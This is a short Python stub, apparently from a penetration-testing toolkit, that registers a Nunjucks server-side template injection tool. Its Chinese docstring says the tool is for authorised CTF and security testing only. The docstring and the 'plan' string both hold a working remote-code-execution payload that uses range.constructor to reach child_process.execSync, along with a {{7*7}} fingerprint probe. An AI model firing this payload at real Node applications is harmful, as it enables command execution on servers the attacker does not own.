"""Nunjucks SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: {{7*7}}→49(Jinja2 移植版)。
RCE: {{range.constructor("return global.process.mainModule.require('child_process').execSync(cmd).toString()")()}}

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiNunjucksTool(SstiEngineTool):
    name = "ssti_nunjucks"
    description = "Nunjucks(Node) SSTI:range.constructor 构造 Function 执行命令(占位符)"
    engine_key = "nunjucks"
    engine_name = "Nunjucks"
    default_mode = "exec"
    plan = r"""指纹: {{7*7}}→49(Jinja2 移植版)。
RCE: {{range.constructor("return global.process.mainModule.require('child_process').execSync(cmd).toString()")()}}"""
